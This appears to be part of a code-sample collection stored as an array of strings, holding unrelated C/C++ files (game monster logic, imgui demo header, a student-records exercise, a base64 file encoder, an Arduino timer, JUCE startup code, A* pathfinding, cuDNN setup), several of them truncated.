\n{\n\t\"zombie/zo_pain1.wav\",\n\t\"zombie/zo_pain2.wav\",\n};\n\n//=========================================================\n// Classify - indicates this monster's place in the \n// relationship table.\n//=========================================================\nint\tCZombie :: Classify ( void )\n{\n\treturn\tCLASS_ALIEN_MONSTER;\n}\n\n//=========================================================\n// SetYawSpeed - allows each sequence to have a different\n// turn rate associated with it.\n//=========================================================\nvoid CZombie :: SetYawSpeed ( void )\n{\n\tint ys;\n\n\tys = 120;\n\n#if 0\n\tswitch ( m_Activity )\n\t{\n\t}\n#endif\n\n\tpev->yaw_speed = ys;\n}\n\nint CZombie :: TakeDamage( entvars_t *pevInflictor, entvars_t *pevAttacker, float flDamage, int bitsDamageType )\n{\n\t// Take 30% damage from bullets\n\tif ( bitsDamageType == DMG_BULLET )\n\t{\n\t\tVector vecDir = pev->origin - (pevInflictor->absmin + pevInflictor->absmax) * 0.5;\n\t\tvecDir = vecDir.Normalize();\n\t\tfloat flForce = DamageForce( flDamage );\n\t\tpev->velocity = pev->velocity + vecDir * flForce;\n\t\tflDamage *= 0.3;\n\t}\n\n\t// HACK HACK -- until we fix this.\n\tif ( IsAlive() )\n\t\tPainSound();\n\treturn CBaseMonster::TakeDamage( pevInflictor, pevAttacker, flDamage, bitsDamageType );\n}\n\nvoid CZombie :: PainSound( void )\n{\n\tint pitch = 95 + RANDOM_LONG(0,9);\n\n\tif (RANDOM_LONG(0,5) < 2)\n\t\tEMIT_SOUND_DYN ( ENT(pev), CHAN_VOICE, pPainSounds[ RANDOM_LONG(0,ARRAYSIZE(pPainSounds)-1) ], 1.0, ATTN_NORM, 0, pitch );\n}\n\nvoid CZombie :: AlertSound( void )\n{\n\tint pitch = 95 + RANDOM_LONG(0,9);\n\n\tEMIT_SOUND_DYN ( ENT(pev), CHAN_VOICE, pAlertSounds[ RANDOM_LONG(0,ARRAYSIZE(pAlertSounds)-1) ], 1.0, ATTN_NORM, 0, pitch );\n}\n\nvoid CZombie :: IdleSound( void )\n{\n\tint pitch = 100 + RANDOM_LONG(-5,5);\n\n\t// Play a random idle sound\n\tEMIT_SOUND_DYN ( ENT(pev), CHAN_VOICE, pIdleSounds[ RANDOM_LONG(0,ARRAYSIZE(pIdleSounds)-1) ], 1.0, ATTN_NORM, 0, pitch );\n}\n\nvoid CZombie :: AttackSound( void )\n{\n\tint pitch = 100 + RANDOM_LONG(-5,5);\n\n\t// Play a random attack sound\n\tEMIT_SOUND_DYN ( ENT(pev), CHAN_VOICE, pAttackSounds[ RANDOM_LONG(0,ARRAYSIZE(pAttackSounds)-1) ], 1.0, ATTN_NORM, 0, pitch );\n}\n\n\n//=========================================================\n// HandleAnimEvent - catches the monster-specific messages\n// that occur when tagged animation frames ar",
    "#include <iostream>\n#include \"fmt/core.h\"\n#include \"glad/gl.h\"\n#include \"SDL3/SDL.h\"\n\nimport brot.window;\nimport brot.engine;\n\nint main(int, char *[]) {\n    auto e = brot::engine();\n\n    e.declare_dependencies<brot::stage::update>(\"a\", {\"b\"});\n    e.declare_dependencies<brot::stage::update>(\"b\", {\"c\"});\n\n    e.register_receiver<brot::stage::update>(\"a\", [](const auto &){\n        fmt::println(\"a update\");\n    });\n\n    e.register_receiver<brot::stage::update>(\"b\", [](const auto &){\n        fmt::println(\"b update\");\n    });\n\n    e.register_receiver<brot::stage::update>(\"c\", [](const auto &){\n        fmt::println(\"c update\");\n    });\n\n    e.run_stage<brot::stage::update>(0.0);\n\n//    auto w = brot::window();\n//\n//    auto *sdl_gl_ctx = SDL_GL_CreateContext(w.handle());\n//    if (!sdl_gl_ctx) {\n//        fmt::println(\"Failed to create SDL GL context: {}\", SDL_GetError());\n//        return 1;\n//    }\n//\n//    GladGLContext gl{};\n//    auto glad_version = gladLoadGLContext(&gl, (GLADloadfunc) SDL_GL_GetProcAddress);\n//    fmt::println(\"Using Glad v{}.{}\",\n//                 GLAD_VERSION_MAJOR(glad_version), GLAD_VERSION_MINOR(glad_version));\n//\n//    SDL_ShowWindow(w.handle());\n//\n//    bool running = true;\n//    do {\n//        SDL_Event e;\n//        while (SDL_PollEvent(&e)) {\n//            switch (e.type) {\n//                case SDL_EVENT_QUIT:\n//                    running = false;\n//                    break;\n//            }\n//        }\n//\n//        gl.ClearColor(0.0f, 0.0f, 0.0f, 1.0f);\n//        gl.Clear(GL_COLOR_BUFFER_BIT | GL_DEPTH_BUFFER_BIT);\n//\n//        SDL_GL_SwapWindow(w.handle());\n//    } while (running);\n//\n//    SDL_GL_DestroyContext(sdl_gl_ctx);\n//\n//    return 0;\n}\n",
    "// dear imgui, v1.91.1 WIP\n// (demo code)\n\n// Help:\n// - Read FAQ at http://dearimgui.com/faq\n// - Call and read ImGui::ShowDemoWindow() in imgui_demo.cpp. All applications in examples/ are doing that.\n// - Need help integrating Dear ImGui in your codebase?\n//   - Read Getting Started https://github.com/ocornut/imgui/wiki/Getting-Started\n//   - Read 'Programmer guide' in imgui.cpp for notes on how to setup Dear ImGui in your codebase.\n// Read top of imgui.cpp and imgui.h for many details, documentation, comments, links.\n// Get the latest version at https://github.com/ocornut/imgui\n\n// How to easily locate code?\n// - Use Tools->Item Picker to debug break in code by clicking any widgets: https://github.com/ocornut/imgui/wiki/Debug-Tools\n// - Browse an online version the demo with code linked to hovered widgets: https://pthom.github.io/imgui_manual_online/manual/imgui_manual.html\n// - Find a visible string and search for it in the code!\n\n//---------------------------------------------------\n// PLEASE DO NOT REMOVE THIS FILE FROM YOUR PROJECT!\n//---------------------------------------------------\n// Message to the person tempted to delete this file when integrating Dear ImGui into their codebase:\n// Think again! It is the most useful reference code that you and other coders will want to refer to and call.\n// Have the ImGui::ShowDemoWindow() function wired in an always-available debug menu of your game/app!\n// Also include Metrics! ItemPicker! DebugLog! and other debug features.\n// Removing this file from your project is hindering access to documentation for everyone in your team,\n// likely leading you to poorer usage of the library.\n// Everything in this file will be stripped out by the linker if you don't call ImGui::ShowDemoWindow().\n// If you want to link core Dear ImGui in your shipped builds but want a thorough guarantee that the demo will not be\n// linked, you can setup your imconfig.h with #define IMGUI_DISABLE_DEMO_WINDOWS and those functions will be empty.\n// In another situation, whenever you have Dear ImGui available you probably want this to be available for reference.\n// Thank you,\n// -Your beloved friend, imgui_demo.cpp (which you won't delete)\n\n//--------------------------------------------\n// ABOUT THE MEANING OF THE 'static' KEYWORD:\n//--------------------------------------------\n// In this demo code, we frequently use 'static' variables inside functions.\n// A static variable persists across calls. It is essentially a global variable but declared inside the scope of the function.\n// Think of \"static int n = 0;\" as \"global int n = 0;\" !\n// We do this IN THE DEMO because we want:\n// - to gather code and data in the same place.\n// - to make the demo source code faster to read, faster to change, smaller in size.\n// - it is also a convenient way of storing simple UI related information as long as your function\n//   doesn't need to be reentrant or used in multiple threads.\n// This might be a pattern you will want to use in your code, but most of the data you would be working\n// with in a complex codebase is likely going to be stored outside your functions.\n\n//-----------------------------------------\n// ABOUT THE CODING STYLE OF OUR DEMO CODE\n//-----------------------------------------\n// The Demo code in this file is designed to be easy to copy-and-paste into your application!\n// Because of this:\n// - We never omit the ImGui:: prefix when calling functions, even though most code here is in the same namespace.\n// - We try to declare static variables in the local scope, as close as possible to the code using them.\n// - We never use any of the helpers/facilities used internally by Dear ImGui, unless available in the public API.\n// - We never use maths operators on ImVec2/ImVec4. For our other sources files we use them, and they are provided\n//   by imgui.h using the IMGUI_DEFINE_MATH_OPERATORS define. For your own sources file they are optional\n//   and require you either enable those, either provide your own via IM_VEC2_CLASS_EXTRA in imconfig.h.\n//   Because we can't assume anything about your support of maths operators, we cannot use them in imgui_demo.cpp.\n\n// Navigating this file:\n// - In Visual Studio: CTRL+comma (\"Edit.GoToAll\") can follow symbols inside comments, whereas CTRL+F12 (\"Edit.GoToImplementation\") cannot.\n// - In Visual Studio w/ Visual Assist installed: ALT+G (\"VAssistX.GoToImplementation\") can also follow symbols inside comments.\n// - In VS Code, CLion, etc.: CTRL+click can follow symbols inside comments.\n// - You can search/grep for all sections listed in the index to find the section.\n\n/*\n\nIndex of this file:\n\n// [SECTION] Forward Declarations\n// [SECTION] Helpers\n// [SECTION] Helpers: ExampleTreeNode, ExampleMemberInfo (for use by Property Editor & Multi-Select demos)\n// [SECTION] Demo Window / ShowDemoWindow()\n// [SECTION] ShowDemoWindowMenuBar()\n// [SECTION] ShowDemoWindowWidgets()\n// [SECTION] ShowDemoWindowMultiSelect()\n// [SECTION] ShowDemoWindowLayout()\n// [SECTION] ShowDem",
    "\ufeff#include <iostream>\n#include <list>\n#include <string>\n#include <fstream>\nusing namespace std;\nclass disciplina {\nprivate:\n\tstring denumire;\n\tfloat calificativ;\npublic:\n\tdisciplina(string denumire, float calificativ) {\n\t\tthis->calificativ = calificativ;\n\t\tthis->denumire = denumire;\n\t}\n\tvoid afisare_disiciplina() {\n\t\tcout << \"DENUMIRE: \" << denumire << endl;\n\t\tcout << \"CALIFICATIV: \" << calificativ << endl;\n\t}\n\tvoid afisare_disiciplina_fisier(ofstream &fout) {\n\t\tfout << \"DENUMIRE: \" << denumire << endl;\n\t\tfout << \"CALIFICATIV: \" << calificativ << endl;\n\t}\n\tfloat get_calificativ() {\n\t\treturn calificativ;\n\t}\n\tstring get_denumire_disciplina() {\n\t\treturn denumire;\n\t}\n\tvoid modificare_nota(float nota_noua) {\n\t\tcalificativ = nota_noua;\n\t}\n};\nclass profesor_coordonator {\n\tstring nume;\n\tint varsta;\n\tstring materie_predata;\npublic:\n\tprofesor_coordonator(string nume, int varsta, string materie_predata) {\n\t\tthis->nume = nume;\n\t\tthis->varsta = varsta;\n\t\tthis->materie_predata = materie_predata;\n\t}\n\tvoid afisare_profesor() {\n\t\tcout << \"NUME PROFESOR: \" << nume << endl;\n\t\tcout << \"VARSTA PROFESOR: \" << varsta << endl;\n\t\tcout << \"MATERIA PREDATA: \" << materie_predata << endl;\n\t}\n\tvoid afisare_profesor_fisier(ofstream &fout) {\n\t\tfout << \"NUME PROFESOR: \" << nume << endl;\n\t\tfout << \"VARSTA PROFESOR: \" << varsta << endl;\n\t\tfout << \"MATERIA PREDATA: \" << materie_predata << endl;\n\t}\n\tstring get_nume_profesor() {\n\t\treturn nume;\n\t}\n};\nclass student {\nprivate:\n\tint varsta,varsta_p;\n\tstring nume,nume_p,materie_p;\n\tfloat medie;\n\tlist <disciplina *> discipline;\n\tbool an_terminal;\n\tprofesor_coordonator *p;\npublic:\n\tstudent(string nume,int varsta,list <disciplina*> disp, bool an_terminal,profesor_coordonator *pre) {\n\t\tthis->nume = nume;\n\t\tthis->varsta = varsta;\n\t\tdiscipline.assign(disp.begin(), disp.end());\n\t\tthis->an_terminal = an_terminal;\n\t\t\tfor (disciplina *x : discipline)\n\t\t\t\tmedie = medie+ x->get_calificativ();\n\t\t\tmedie = medie / discipline.size();\n\t\t\tif (an_terminal == 1) {\n\t\t\t\t\n\t\t\t\tmedie = medie + varsta / 10;\n\t\t\t\tp = pre;\n\t\t\t}\n\t}\n\tvoid afisare_student() {\n\t\tcout << \"NUME: \" << nume << endl;\n\t\tcout << \"VARSTA: \" << varsta << endl;\n\t\tcout << \"STUDENTUL ESTE AN TERMINAL: \" << (an_terminal ? \"DA\" : \"NU\") << endl;;\n\t\tcout << \"Materiile studiate de student: \" << endl;\n\t\tfor (disciplina *x : discipline)\n\t\t\tx->afisare_disiciplina();\n\t\tcout << \"MEDIE: \" << medie << endl;\n\t\tif (an_terminal == 1) {\n\t\t\tcout << \"PROFESORUL COORDONATOR ESTE: \" << endl;\n\t\t\tp->afisare_profesor();\n\t\t}\n\t}\n\tvoid afisare_student_fisier(ofstream &fout) {\n\t\tfout << \"NUME: \" << nume << endl;\n\t\tfout << \"VARSTA: \" << varsta << endl;\n\t\tfout << \"STUDENTUL ESTE AN TERMINAL: \" << (an_terminal ? \"DA\" : \"NU\") << endl;;\n\t\tfout << \"Materiile studiate de student: \" << endl;\n\t\tfor (disciplina *x : discipline)\n\t\t\tx->afisare_disiciplina_fisier(fout);\n\t\tfout << \"MEDIE: \" << medie << endl;\n\t\tif (an_terminal == 1) {\n\t\t\tfout << \"PROFESORUL COORDONATOR ESTE: \" << endl;\n\t\t\tp->afisare_profesor_fisier(fout);\n\t\t}\n\t}\n\tint get_varsta() {\n\t\treturn varsta;\n\t}\n\tstring returnare_nume_profesor_coordonator() {\n\t\treturn p->get_nume_profesor();\n\t}\n\tbool este_an_terminal() {\n\t\treturn an_terminal;\n\t}\n\tvoid cautare_disciplina(string nume,float nota) {\n\t\tfor (disciplina *x : discipline)\n\t\t\tif (x->get_denumire_disciplina() == nume)\n\t\t\t{\n\t\t\t\tx->modificare_nota(nota);\n\t\t\t\tmedie = 0;\n\t\t\t}\n\t\tfor (disciplina *x : discipline)\n\t\t\tmedie = medie + x->get_calificativ();\n\t\tmedie = medie / discipline.size();\n\t\tif (an_terminal == 1) {\n\n\t\t\tmedie = medie + varsta / 10;\n\t\t\t\n\t\t}\n\n\t}\n\tstring get_nume_student() {\n\t\treturn nume;\n\t}\n\tfloat get_medie() {\n\t\treturn medie;\n\t}\n\tstudent operator ++(int) {\n\t\tvarsta = varsta + 1;\n\t\treturn *this;\n\t}\n\t\n\t\n\tbool operator==(const student s)  {\n\t\treturn this->medie == s.medie;\n\t}\n\n};\nvoid citire_globala_fisier(list <student *>& studenti,ifstream &in) {\n\tint varsta, varsta_p,nr_discipline;\n\tstring nume, nume_p, materie_p;\n\tfloat medie;\n\tlist <disciplina *> discipline;\n\tdisciplina *d;\n\tstring denumire;\n\tfloat calificativ;\n\tbool an_terminal;\n\tstudent *s;\n\tprofesor_coordonator *p=nullptr;\n\twhile (in >> nume >> varsta) {\n\t\tin >> nr_discipline;\n\t\tfor (int i = 1; i <= nr_discipline; i++)\n\t\t{\n\t\t\tin >> denumire >> calificativ;\n\t\t\td = new disciplina(denumire, calificativ);\n\t\t\tdiscipline.push_back(d);\n\t\t}\n\t\tin >> an_terminal;\n\t\tif (an_terminal == 1){\n\t\t\tin >> nume_p >> varsta_p >> materie_p;\n\t\t\tp = new profesor_coordonator(nume_p, varsta_p, materie_p);\n}\n\t\ts = new student(nume, varsta, discipline, an_terminal, p);\n\t\tstudenti.push_back(s);\n\t\tdiscipline.clear();\n}\n\n\t  }\nvoid cautare_varsta(int varsta, list <student *>studenti) {\n\tint k = 0;\n for(student *x: studenti)\n\t if (varsta == x->get_varsta()) {\n\t\t x->afisare_student();\n\t\t cout << endl; \n\t\t k = 1;\n\t }\n if (k == 0)\n\t cout << \"NU EXISTA STUDENTI!!!\" << endl;\n}\nvoid cautare_profesor_coordonator(string nume,list <student *>studenti) {\n\tint k = 0;\n\tfor(student *x:studenti )\n\t\tif(x->este_an_terminal()==1 && x->returnare_nume_profesor_coordonator()==nu",
    "#include <iostream>\n#include <fstream>\n#include <string>\n#include <cstdio>\n#include <vector>\n\nusing namespace std;\n\nconst string base64_chars = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\";\n\nstring base64_encode(const string &input)\n{\n    string output;\n    int val = 0, valb = -6;\n    for (unsigned char c : input)\n    {\n        val = (val << 8) + c;\n        valb += 8;\n        while (valb >= 0)\n        {\n            output.push_back(base64_chars[(val >> valb) & 0x3F]);\n            valb -= 6;\n        }\n    }\n    if (valb > -6)\n        output.push_back(base64_chars[((val << 8) >> (valb + 8)) & 0x3F]);\n    while (output.size() % 4)\n        output.push_back('=');\n    return output;\n}\n\nstring base64_decode(const string &input)\n{\n    vector<int> T(256, -1);\n    for (int i = 0; i < 64; i++) T[base64_chars[i]] = i;\n\n    string output;\n    int val = 0, valb = -8;\n    for (unsigned char c : input)\n    {\n        if (T[c] == -1) break;\n        val = (val << 6) + T[c];\n        valb += 6;\n        if (valb >= 0)\n        {\n            output.push_back(char((val >> valb) & 0xFF));\n            valb -= 8;\n        }\n    }\n    return output;\n}\n\nclass File\n{\n    string inputFile;\n    string tempFile;\n\n    public:\n    File(string inputFile)\n    {\n        this->inputFile = inputFile;\n        this->tempFile = inputFile + \".tmp\";\n    }\n\n    File operator++(int)\n    {\n        File temp = *this;\n\n        ifstream input(inputFile, ios::binary);\n        ofstream output(tempFile, ios::binary);\n\n        if (!input.is_open() || !output.is_open())\n        {\n            cerr << \"Error opening file!\" << endl;\n            return temp;\n        }\n\n        string fileContent((istreambuf_iterator<char>(input)), istreambuf_iterator<char>());\n        string encodedContent = base64_encode(fileContent);\n        output << encodedContent;\n\n        input.close();\n        output.close();\n\n        remove(inputFile.c_str());\n        rename(tempFile.c_str(), inputFile.c_str());\n\n        return temp;\n    }\n\n    File operator--(int)\n    {\n        File temp = *this;\n\n        ifstream input(inputFile, ios::binary);\n        ofstream output(tempFile, ios::binary);\n\n        if (!input.is_open() || !output.is_open())\n        {\n            cerr << \"Error opening file!\" << endl;\n            return temp;\n        }\n\n        string fileContent((istreambuf_iterator<char>(input)), istreambuf_iterator<char>());\n        string decodedContent = base64_decode(fileContent);\n        output << decodedContent;\n\n        input.close();\n        output.close();\n\n        remove(inputFile.c_str());\n        rename(tempFile.c_str(), inputFile.c_str());\n\n        return temp;\n    }\n\n    ostream& operator<<(ostream& os)\n    {\n        ifstream file(inputFile);\n        if (file.is_open()) {\n            string line;\n            while (getline(file, line)) {\n                os << line << endl;\n            }\n            file.close();\n        } else {\n            os << \"Error: Could not open the file.\\n\";\n        }\n        return os;\n    }\n\n    ~File(){}\n};\n\nint main()\n{\n    string inputFile;\n    cout << \"Enter the name of the file : \";\n    cin >> inputFile;\n    File f1(inputFile);\n    char choice;\n\n    while (true)\n    {\n        cout << \"Do you want to encode (e) or decode (d) or print (p) or break (b)? \";\n        cin >> choice;\n\n        if (choice == 'e')\n        {\n            f1++;\n            cout << \"The file has been encoded.\" << endl;\n        }\n        else if (choice == 'd')\n        {\n            f1--;\n            cout << \"The file has been decoded.\" << endl;\n        }\n        else if (choice == 'p')\n        {\n            cout << \"\\n\\n\\n\";\n            f1 << cout;\n            cout << \"\\n\\n\\n\";\n        }\n        else if (choice == 'b')\n        {\n            break;\n        }\n        else\n        {\n            cout << \"Invalid choice!\" << endl;\n        }\n    }\n\n    return 0;\n}\n",
    "/*******************************************************************************\n- File Name:\n    OnlyTimer.cpp    \n    Created: 2024/07/28 by Luan Tran \n\n- Release notes:\n\tSee OnlyTimer.h file\n\n *******************************************************************************/\n#include \"OnlyTimer.h\"\n\nuint32_t nTmrClients = 0;\nOnlyTimer *tmrObjArr[MAX_TIMER_CLIENTS];\n\n/*\nTimer Object Constructor\nAfter a timer object is created, it will be added to the timer object pointer array \nand the number of client will be keep track of.\n*/\nOnlyTimer::OnlyTimer(){\t\n\tthis->startMillis = 0;\n\tthis->interval = 0;\n\tthis->periodic = false;\n\tthis->isRunning = false;\n\tthis->CallbackFunc = NULL;\n\tthis->cbParameter = NULL;\t\n\tif(nTmrClients < MAX_TIMER_CLIENTS){\n\t\ttmrObjArr[nTmrClients] = this;\n\t\tnTmrClients++;\t\n\t\tthis->available = true;\n\t}\n\telse{\n\t\tthis->available = false;\n\t}\n}\n\n/*\nThis function will call callbackFunc ONLY 1 time after milliInterval(ms) has passed.\na parameter pointer can also be passed into the callbackFunc\n\n- milliInterval: 1-time time in ms\n- callbackFunc: callback fuction pointer\n- paramPtr: callback function parameter pointer\n\nReturn:\n- true: if timer has been set successfully\n- false: if timer is busy or not available\n*/\nbool OnlyTimer::SingleCallbackIn(uint32_t milliInterval, void(*callbackFunc)(void*), void* paramPtr){\n  if(this->isRunning || !(this->available))\n    return false;\n\tthis->interval = milliInterval;\n\tthis->periodic = false;\n\tthis->CallbackFunc = callbackFunc;\n\tthis->cbParameter = paramPtr;\n\tthis->startMillis = millis(); \n\tthis->isRunning = true;\n  return true;\n}\n\n  \n/*\n*This function will periodically call callbackFunc every milliInterval(ms). A parameter \n*pointer can also be passed into the callbackFunc\n\n- milliInterval: periodic time in ms\n- callbackFunc: callback fuction pointer\n- paramPtr: callback function parameter pointer\n\nReturn:\n- true: if timer has been set successfully\n- false: if timer is busy or not available\n*/\nbool OnlyTimer::PeriodicCallbackEvery(uint32_t milliInterval, void(*callbackFunc)(void*), void* paramPtr){  \n  if(this->isRunning || !(this->available))\n    return false;\n\tthis->interval = milliInterval;\n\tthis->periodic = true;\n\tthis->CallbackFunc = callbackFunc;\n\tthis->cbParameter = paramPtr;\n\tthis->startMillis = millis(); \n\tthis->isRunning = true;\n  return true;\n}\n\n/*\n*This function start timer for milliInterval(ms). This is a simple non-blocking way to\n*do \"delay\" or simply check if a certain time has passed by pooling \"IsRunning\" after\n*\"SetTimeout\"\n\nReturn:\n- true: if timer has been set successfully\n- false: if timer is busy or not available\n*/\nbool OnlyTimer::SetTimeout(uint32_t milliInterval){\n  return this->SingleCallbackIn(milliInterval, NULL);\n}\n\n\n\t\n/*\n*This function reset the timer counter ONLY if it's still running. \n*If the timer is stopped, it won't start the timmer.\n\nReturn:\n- true: if timer has been reset successfully\n- false: if timer is not running\n*/\nbool OnlyTimer::Reset(void){\n  if(this->isRunning){\t\t\n\t\tif(millis() - this->startMillis < this->interval){//still not timed out yet\n\t\t\tthis->startMillis = millis();\n\t\t\treturn true;\n\t\t}\n  }\n  return false;\n}\n\n/*\n*This function will stop the timer.\n*/\nvoid OnlyTimer::Stop(){\n\tthis->isRunning = false;\n\tthis->startMillis = 0;\n\tthis->interval = 0;\n\tthis->periodic = false;\n}\n\n/*\n*This function will be checked by the timer task in the main loop.\n*Calling this won't affect timer functionalities, but it is not recommended.\n*/\nvoid OnlyTimer::SelfCheck(){\n  uint32_t currentMillis;\n  if(this->isRunning){//timer is running, must check\n    currentMillis = millis();\n    if(currentMillis - this->startMillis >= this->interval){//timeout\n      if(this->periodic == false)//single callback, stop timer\n        this->Stop();\n      else//periodic callback, update start time and continue\n        this->startMillis = currentMillis;\n      if(CallbackFunc)//callback\n        CallbackFunc(cbParameter);       \n    }\n  }\n}\n\n/*\n * This function will continuously loop through all the timer objects and check if any timer has fired\n */\nvoid OnlyTimer_Task(void){\n  uint32_t i;  \n  for(i = 0; i < nTmrClients; i++){\n    tmrObjArr[i]->SelfCheck();    \n  }\n}\n\n/*******************************************************************************\n End of File\n*/\n",
    "/*\n  ==============================================================================\n\n    This file contains the basic startup code for a JUCE application.\n\n  ==============================================================================\n*/\n\n#include <JuceHeader.h>\n#include \"MainComponent.h\"\n\n//==============================================================================\nclass HelloWorldApplication  : public juce::JUCEApplication\n{\npublic:\n    //==============================================================================\n    HelloWorldApplication() {}\n\n    const juce::String getApplicationName() override       { return ProjectInfo::projectName; }\n    const juce::String getApplicationVersion() override    { return ProjectInfo::versionString; }\n    bool moreThanOneInstanceAllowed() override             { return true; }\n\n    //==============================================================================\n    void initialise (const juce::String& commandLine) override\n    {\n        // This method is where you should put your application's initialisation code..\n\n        mainWindow.reset (new MainWindow (getApplicationName()));\n    }\n\n    void shutdown() override\n    {\n        // Add your application's shutdown code here..\n\n        mainWindow = nullptr; // (deletes our window)\n    }\n\n    //==============================================================================\n    void systemRequestedQuit() override\n    {\n        // This is called when the app is being asked to quit: you can ignore this\n        // request and let the app carry on running, or call quit() to allow the app to close.\n        quit();\n    }\n\n    void anotherInstanceStarted (const juce::String& commandLine) override\n    {\n        // When another instance of the app is launched while this one is running,\n        // this method is invoked, and the commandLine parameter tells you what\n        // the other instance's command-line arguments were.\n    }\n\n    //==============================================================================\n    /*\n        This class implements the desktop window that contains an instance of\n        our MainComponent class.\n    */\n    class MainWindow    : public juce::DocumentWindow\n    {\n    public:\n        MainWindow (juce::String name)\n            : DocumentWindow (name,\n                              juce::Desktop::getInstance().getDefaultLookAndFeel()\n                                                          .findColour (juce::ResizableWindow::backgroundColourId),\n                              DocumentWindow::allButtons)\n        {\n            setUsingNativeTitleBar (true);\n            setContentOwned (new MainComponent(), true);\n\n           #if JUCE_IOS || JUCE_ANDROID\n            setFullScreen (true);\n           #else\n            setResizable (true, true);\n            centreWithSize (getWidth(), getHeight());\n           #endif\n\n            setVisible (true);\n        }\n\n        void closeButtonPressed() override\n        {\n            // This is called when the user tries to close this window. Here, we'll just\n            // ask the app to quit when this happens, but you can change this to do\n            // whatever you need.\n            JUCEApplication::getInstance()->systemRequestedQuit();\n        }\n\n        /* Note: Be careful if you override any DocumentWindow methods - the base\n           class uses a lot of them, so by overriding you might break its functionality.\n           It's best to do all your work in your content component instead, but if\n           you really have to override any DocumentWindow methods, make sure your\n           subclass also calls the superclass's method.\n        */\n\n    private:\n        JUCE_DECLARE_NON_COPYABLE_WITH_LEAK_DETECTOR (MainWindow)\n    };\n\nprivate:\n    std::unique_ptr<MainWindow> mainWindow;\n};\n\n//==============================================================================\n// This macro generates the main() routine that launches the app.\nSTART_JUCE_APPLICATION (HelloWorldApplication)\n",
    "#include \"astar.h\"\n\n\nfloat AStar::Heuristic(int x1, int y1, int x2, int y2) {\n    return std::abs(x1 - x2) + std::abs(y1 - y2);\n}\n\nstd::vector<AStar::Node> AStar::GetNeighbors(Node& node, Grid& grid) {\n    std::vector<Node> neighbors;\n    std::vector<std::pair<int, int>> directions = { {1, 0}, {-1, 0}, {0, 1}, {0, -1} };\n\n    for (const auto& dir : directions) {\n        int newX = node.x + dir.first;\n        int newY = node.y + dir.second;\n\n        if (newX >= 0 && newX < grid.GetColumns() && newY >= 0 && newY < grid.GetRows() &&\n            grid.GetCellState(newX * grid.GetCellSize(), newY * grid.GetCellSize()) != BLOCK) {\n            neighbors.push_back(Node(newX, newY, true));\n        }\n    }\n\n    return neighbors;\n}\n\nstd::vector<AStar::Node> AStar::ReconstructPath(Node& endNode, std::vector<std::vector<Node>>& allNodes) {\n    std::vector<Node> path;\n    Node* currentNode = &endNode;\n\n    while (currentNode->parentX != -1 && currentNode->parentY != -1) {\n        path.push_back(*currentNode);\n        currentNode = &allNodes[currentNode->parentY][currentNode->parentX];\n    }\n    path.push_back(*currentNode);\n\n    std::reverse(path.begin(), path.end());\n    return path;\n}\n\nvoid AStar::Initialize(Grid& grid, int startX, int startY, int endX, int endY) {\n    allNodes = std::vector<std::vector<Node>>(grid.GetRows(), std::vector<Node>(grid.GetColumns(), Node(-1, -1, false)));\n\n    for (int y = 0; y < grid.GetRows(); y++) {\n        for (int x = 0; x < grid.GetColumns(); x++) {\n            allNodes[y][x] = Node(x, y, grid.GetCellState(x * grid.GetCellSize(), y * grid.GetCellSize()) != BLOCK);\n        }\n    }\n\n    Node& startNode = allNodes[startY][startX];\n    startNode.gCost = 0;\n    startNode.hCost = Heuristic(startX, startY, endX, endY);\n    startNode.fCost = startNode.gCost + startNode.hCost;\n\n    openNodes.clear();\n    closedNodes.clear();\n    openNodes.push_back(startNode);\n}\n\nstd::vector<AStar::Node> AStar::ProcessStep(Grid& grid, int endX, int endY) {\n    if (openNodes.empty()) {\n        return std::vector<Node>(); // No path found\n    }\n\n    auto cmp = [](Node& left, Node& right) { return left.fCost > right.fCost; };\n    std::priority_queue<Node, std::vector<Node>, decltype(cmp)> openSet(cmp, openNodes);\n\n    Node currentNode = openSet.top();\n    openSet.pop();\n    openNodes.erase(std::remove(openNodes.begin(), openNodes.end(), currentNode), openNodes.end());\n\n    if (currentNode.x == endX && currentNode.y == endY) {\n        return ReconstructPath(currentNode, allNodes);\n    }\n\n    closedNodes.push_back(currentNode);\n\n    for (Node& neighbor : GetNeighbors(currentNode, grid)) {\n        Node& actualNeighbor = allNodes[neighbor.y][neighbor.x];\n\n        if (std::find(closedNodes.begin(), closedNodes.end(), actualNeighbor) != closedNodes.end()) {\n            continue;\n        }\n\n        float tentativeGCost = currentNode.gCost + Heuristic(currentNode.x, currentNode.y, actualNeighbor.x, actualNeighbor.y);\n\n        bool inOpenSet = std::find(openNodes.begin(), openNodes.end(), actualNeighbor) != openNodes.end();\n\n        if (tentativeGCost < actualNeighbor.gCost || !inOpenSet) {\n            actualNeighbor.gCost = tentativeGCost;\n            actualNeighbor.hCost = Heuristic(actualNeighbor.x, actualNeighbor.y, endX, endY);\n            actualNeighbor.fCost = actualNeighbor.gCost + actualNeighbor.hCost;\n            actualNeighbor.parentX = currentNode.x;\n            actualNeighbor.parentY = currentNode.y;\n\n            if (!inOpenSet) {\n                openSet.push(actualNeighbor);\n                openNodes.push_back(actualNeighbor);\n            }\n        }\n    }\n\n    return std::vector<Node>();\n}\n\nvoid AStar::Reset() {\n    openNodes.clear();\n    closedNodes.clear();\n    allNodes.clear();\n}",
    "// all cudnn-related functions are in this file, so that they don't need to be recompiled everytime\n// we change some unrelated piece of the code.\n// TODO this currently duplicates some of the utilities from the main file\n\n#define NOMINMAX\n#include \"cudnn_att.h\"\n#include <cudnn_frontend.h>\n\nnamespace fe = cudnn_frontend;\n\n// Specific configurations based on the enabled precision\n#if defined(ENABLE_FP32)\nstatic_assert(false, \"cuDNN is not supported in FP32 mode.\")\n// use fp16 (note: this may require gradient scaler, currently not implemented!)\n#elif defined(ENABLE_FP16)\n#define CUDNN_16BIT fe::DataType_t::HALF\n#else // Default to bfloat16\n#define CUDNN_16BIT fe::DataType_t::BFLOAT16\n#endif\n\nstatic cudnnHandle_t cudnn_handle;\nstatic size_t cudnn_workspace_size = 0; // dynamically allocated as needed (up to 256MiB!)\nstatic void* cudnn_workspace = NULL;\n\nstatic void cuDNNCheck(cudnnStatus_t error, const char *file, int line) {\n    if (error != CUDNN_STATUS_SUCCESS) {\n        printf(\"[CUDNN ERROR] at file %s:%d:\\n%s\\n\", file, line, cudnnGetErrorString(error));\n        exit(EXIT_FAILURE);\n    }\n};\n#define cuDNNCheck(err) (cuDNNCheck(err, __FILE__, __LINE__))\n\nstatic void checkCudnnFE(const fe::error_object& e, const char *file, int line) {\n    if(!e.is_good()) {\n        printf(\"[CUDNN ERROR] at file %s:%d:\\n%s\\n\", file, line, 